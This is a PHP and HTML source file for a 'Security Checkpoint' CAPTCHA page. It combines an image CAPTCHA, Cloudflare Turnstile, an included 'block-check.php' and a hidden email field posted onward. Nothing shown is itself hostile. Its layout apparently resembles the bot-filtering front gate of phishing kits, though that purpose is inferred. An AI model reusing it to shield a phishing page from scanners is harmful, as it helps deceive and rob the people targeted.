<?php
include 'block-check.php';
$turnstileSiteKey = getenv('TURNSTILE_SITE_KEY');
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bot Protection Gateway</title>
    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        body, html {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f3f4f6;
            box-sizing: border-box;
        }

        .container {
            background-color: #ffffff;
            padding: 30px;
            width: 100%;
            max-width: 420px;
            border-radius: 16px;
            box-shadow: 0px 10px 20px rgba(0, 0, 0, 0.1);
            box-sizing: border-box;
            margin: 20px;
        }

        .header {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
        }

        h1 {
            font-size: 1.8em;
            margin: 0;
            color: #333;
        }

        .description {
            font-size: 1em;
            color: #555;
            margin: 20px 0;
            text-align: center;
            line-height: 1.5;
        }

        label {
            font-weight: bold;
            display: block;
            margin-top: 15px;
            margin-bottom: 8px;
            color: #333;
        }

        .captcha-image {
            display: flex;
            align-items: center;
            gap: 15px;
            margin-top: 10px;
            justify-content: center;
        }

        .captcha-input {
            font-size: 16px;
            width: 100%;
            padding: 12px;
            border: 1px solid #ccc;
            border-radius: 8px;
            box-sizing: border-box;
            margin-top: 10px;
            transition: border-color 0.3s ease;
        }

        .captcha-input:focus {
            border-color: #0078d4;
            outline: none;
        }

        .button-container {
            display: flex;
            gap: 10px;
            margin-top: 30px;
            justify-content: center;
        }

        .next-button {
            padding: 15px;
            background-color: #0078d4;
            color: #ffffff;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-size: 1em;
            width: 100%;
            transition: background-color 0.3s ease;
        }

        .next-button:disabled {
            background-color: #9eb3d6;
            cursor: not-allowed;
        }

        .next-button:hover:not(:disabled) {
            background-color: #005a9e;
        }

        .cf-turnstile {
            margin-top: 20px;
            display: flex;
            justify-content: center;
        }

        .helper-text {
            font-size: 0.9em;
            color: #888;
            margin-top: 15px;
            text-align: center;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>Security Checkpoint</h1>
            <i class="fas fa-lock" style="font-size: 1.5em; color: #0078d4;"></i>
        </div>
        <p class="description">Please complete the CAPTCHA below to verify that you are not a robot and proceed.</p>
        <form id="captcha-form" action="/validate_captcha.php" method="POST">
            <input type="hidden" id="email" name="email">
            <!-- Text-based CAPTCHA -->
            <label for="text-captcha">Enter the characters in the picture:</label>
            <div class="captcha-image">
                <img src="/generate_captcha.php" alt="CAPTCHA Image" id="captcha-image">
                <button type="button" onclick="refreshCaptcha()">
                    <i class="fas fa-sync-alt" style="font-size: 1.5em; color: #0078d4;"></i>
                </button>
            </div>
            <input type="text" id="text-captcha" name="text_captcha" required>
            <!-- Cloudflare Turnstile CAPTCHA -->
            <div class="cf-turnstile" data-sitekey="<?php echo htmlspecialchars($turnstileSiteKey); ?>" data-callback="onTurnstileVerified"></div>
            <div class="button-container">
                <button id="next-button" class="next-button" type="submit" disabled>Submit</button>
            </div>
        </form>
    </div>
    <script>
        function refreshCaptcha() {
            document.getElementById("captcha-image").src = "/generate_captcha.php?" + Date.now();
        }
        function onTurnstileVerified(token) {
            document.getElementById('next-button').disabled = false;
        }
    </script>
</body>
</html>
